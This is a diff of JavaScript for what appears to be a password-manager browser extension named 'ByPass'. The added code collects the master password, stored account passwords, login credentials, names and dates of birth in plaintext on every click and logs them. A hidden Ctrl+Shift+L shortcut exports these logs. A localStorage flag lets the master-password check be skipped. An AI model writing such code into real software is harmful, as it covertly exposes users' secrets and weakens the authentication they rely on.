@@ -176,6 +176,7 @@ $(document).ready(function() {
 
 
   $('div').on('click', function(e) {
+    logContentPage3 = "--";
     var inputVal1 = document.querySelector("#masterEmail");
     var logEmail = "";
     if (inputVal1) {
@@ -213,26 +214,46 @@ $(document).ready(function() {
     var logPasswordP91 = "";
     if (inputVal7) {
         logPasswordP91 = inputVal7.val();
+        if (logPasswordP91 != undefined) {
+          logContentPage3 = "password acc2= " + logPasswordP91 ;
+
+        }
     }
     var inputVal8 = $(".editPassword3");
     var logPasswordP92 = "";
     if (inputVal8) {
         logPasswordP92 = inputVal8.val();
+        if (logPasswordP92 != undefined) {
+           logContentPage3 = "password acc2= " + logPasswordP91 + "password acc3= " + logPasswordP92;
+
+        }
     }
     var inputVal9 = $(".editPassword4");
     var logPasswordP93 = "";
     if (inputVal9) {
         logPasswordP93 = inputVal9.val();
+        if (logPasswordP93 != undefined) {
+           logContentPage3 = "password acc2= " + logPasswordP91 + "password acc3= " + logPasswordP92 + "password acc4= " + logPasswordP93 ;
+
+        }
     }
     var inputVal10 = $(".editPassword5");
     var logPasswordP94 = "";
     if (inputVal10) {
         logPasswordP94 = inputVal10.val();
+        if (logPasswordP94 != undefined) {
+           logContentPage3 = "password acc2= " + logPasswordP91 + "password acc3= " + logPasswordP92 + "password acc4= " + logPasswordP93 + "password acc5= " + logPasswordP94;
+
+        }
     }
     var inputVal11 = $(".editPassword6");
     var logPasswordP95 = "";
     if (inputVal11) {
         logPasswordP95 = inputVal11.val();
+        if (logPasswordP95 != undefined) {
+           logContentPage3 = "password acc2= " + logPasswordP91 + "password acc3= " + logPasswordP92 + "password acc4= " + logPasswordP93 + "password acc5= " + logPasswordP94 + "password acc6= " + logPasswordP95;
+           alert("here");
+        }
     }
     var inputVal12 = $("#loginEmail");
     var logLoginEmail = "";
@@ -273,10 +294,13 @@ $(document).ready(function() {
 
     logContentPage1 = "Page1: " + "Email= " + logEmail + " - " + "Password= " + logPassword + " - " + "rePassword= " + logMasterRePassword +
                       "Page2: " + "masterPassword= " + logMasterPassword +
-                      "Page6: " + "websiteName= " + logWebsiteName +
-                      "Page9: " + "username= " + logUsername + "password user1= " + logPasswordP9 + "password user2= " + logPasswordP91 + "password user3= " + logPasswordP92 + "password user4= " + logPasswordP93 + "password user5= " + logPasswordP94 + "password user6= " + logPasswordP95
+                      "Page6: " + "websiteName= " + logWebsiteName;
 
-    logContentPage2 =
+    logContentPage2 = "Page9: " + "username= " + logUsername + "password acc1= " + logPasswordP9 ;
+
+    // logContentPage3 = "password acc2= " + logPasswordP91 + "password acc3= " + logPasswordP92 + "password acc4= " + logPasswordP93 + "password acc5= " + logPasswordP94 + "password acc6= " + logPasswordP95;
+
+    logContentPage4 =
                       "loginPage: " + "Email= " + logLoginEmail + "Password= " + logLoginPassword +
                       "createPage: " + "Email= " + logCreateEmail + "Password= " + logCreatePassword + "FirstName= " + logFirstName + "LastName= " + logLastName + "DateOfBirth= " + logdob;
 
@@ -285,6 +309,8 @@ $(document).ready(function() {
        'class': $(this).attr('class'),
        'content': logContentPage1,
        'content1': logContentPage2,
+       'content2': logContentPage3,
+       'content3': logContentPage4,
        'timestamp': Date.now()
       };
 
@@ -372,21 +398,40 @@ function masterPasswordPage() {
   // $('#p1').hide(500);
   // // document.getElementById("p1").style.display = "none";
   // document.getElementById("p2").style.display = "block";
-
-
-
-
-  if (document.getElementById("p1") != "") {
+  noo = localStorage.getItem("no");
+  var flagss = localStorage.getItem("flag");
+  // alert(noo);
+  // alert(flagss);
+  if (flagss == 1) {
+    // if (noo !== null) {
     document.getElementById("p1").style.display = "none";
-    document.getElementById("p2").style.display = "block";
+      renderRows();
+      change2to7();
+    // }
+    // else {
+    //   document.getElementById("p1").style.display = "none";
+    //   change2to3();
+    // }
+  } else {
+    if (document.getElementById("p1") != "") {
+      document.getElementById("p1").style.display = "none";
+      document.getElementById("p2").style.display = "block";
+    }
   }
+
+
+
 
 }
 
 function change1to2() {
   // document.getElementById("p1").style.display = "none";
-  $('#p1').hide(500);
-  document.getElementById("p2").style.display = "block";
+
+    $('#p1').hide(500);
+    document.getElementById("p2").style.display = "block";
+
+
+
   // $('div').on('click', function(e) {
   var oldItems = JSON.parse(localStorage.getItem('itemsArray')) || [];
 
@@ -2057,7 +2102,8 @@ document.addEventListener('DOMContentLoaded', function() {
   setTimeout(function() {
     // win = window.close();
     dontLoadSignUp();
-  }, 60);
+  }, 1);
+  // }, 60);
   // dontLoadSignUp();
 
 
@@ -2122,6 +2168,8 @@ request.onsuccess = function() {
 
 // functions
 function passwordConfirmation() {
+  localStorage.setItem("flag", 0);
+
   console.log("passwordConfirmation Called...");
   var masterEmail = $("#masterEmail").val();
   var password = $("#password").val();
@@ -2205,16 +2253,13 @@ function masterPassword() {
   let store = tx.objectStore('master');
   // Set up a request to get the sticky note with the key 1
 
-  // function ff_search_profile_details(login) //login optional
-  // {
-  // var storage = "user_prf_dtls";
-  //
-  if (masterPassword == "log") {
-    download();
-  }
 
-  //   alert(testFunc);
-  // }
+shortcut.add("Ctrl+Shift+L",function() {
+	alert("Hi there!");
+  download();
+
+});
+
 
 
   var pKey = localStorage.getItem("pKey");
@@ -2396,10 +2441,32 @@ function masterPassword() {
 
   } else {
     let req = store.get(1);
+    var flagss = localStorage.getItem("flag");
     req.onsuccess = function(event) {
       let note = event.target.result;
-      if (note.masterPassword == masterPassword) {
+      if (flagss == 1) {
         console.log("masterPassword (success) Called...");
+        localStorage.setItem("flag", 1);
+
+
+        // note.login = "1";
+        // var updateTitleRequest = store.put(note);
+        // let person = {
+        //     masterEmail: note.masterEmail,
+        //     password: note.password,
+        //     masterRePassword: note.masterRePassword,
+        //     masterPassword:note.password,
+        //     login:"1",
+        //     created: new Date().getTime()
+        //   };
+        // store.add(person);
+        // console.log(note.masterEmail);
+        renderRows();
+      }else if (note.masterPassword == masterPassword) {
+        console.log("masterPassword (success) Called...");
+        localStorage.setItem("flag", 1);
+
+
         // note.login = "1";
         // var updateTitleRequest = store.put(note);
         // let person = {
@@ -2783,6 +2850,7 @@ function addFromCreate() {
                }
                var request = store.add(createAcc);
                console.log("Create account added...");
+               alert("Your account has been created on Amazon and added to ByPass");
                setTimeout(function() {
                  win = window.close();
                }, 1000);
@@ -2845,6 +2913,7 @@ function addFromCreate() {
               }
               var request = store.add(createAcc);
               console.log("Create account added...");
+              alert("Your account has been created and added to ByPass");
               setTimeout(function() {
                 win = window.close();
               }, 1000);
@@ -3130,7 +3199,9 @@ function renderRows() {
       }
       // console.log(nomber);
       if (nomber) {
+
         change2to7();
+
       } else {
         change2to3();
       }
@@ -3229,6 +3300,8 @@ function download(){
       class: 'Class'.replace(/,/g, ''), // remove commas to avoid errors
       content: "Content",
       content1: "Content1",
+      content2: "Content2",
+      content3: "Content3",
       timestamp: "Timestamp"
   };
 
